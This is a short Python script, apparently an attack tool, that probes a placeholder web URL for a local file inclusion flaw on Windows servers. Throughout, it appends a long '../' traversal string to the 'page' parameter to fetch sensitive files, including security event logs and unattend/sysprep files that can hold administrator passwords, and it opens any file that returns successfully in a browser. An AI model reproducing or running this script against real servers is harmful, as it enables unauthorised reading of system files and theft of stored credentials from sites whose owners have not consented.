import requests
import webbrowser
 

#LFI check in windows server.

 
url = 'http://targetwebsite-URL/?page='
 
LFI = '../../../../../../../../../../'

#onepage = 'WINDOWS/system32/drivers/etc/hosts'

pages = ['WINDOWS/system32/drivers/etc/hosts', 'WINDOWS/system32/win.ini', 'WINDOWS/system32/debug/NetSetup.log', 'WINDOWS/system32/config/AppEvent.Evt', 'WINDOWS/system32/config/SecEvent.Evt', 'WINDOWS/Panther/unattend.txt', 'WINDOWS/Panther/unattend.xml', 'WINDOWS/Panther/unattended.xml', 'WINDOWS/Panther/sysprep.inf']
 
for x in pages:
                  check = requests.get(url + LFI + x)
                  if check.status_code == 200:
                                    webbrowser.open(url + LFI + x)
                                    
#check2 = requests.get(url + LFI + onepage)
#if check2.status_code == 200:
#	webbrowser.open(url + LFI + onepage)
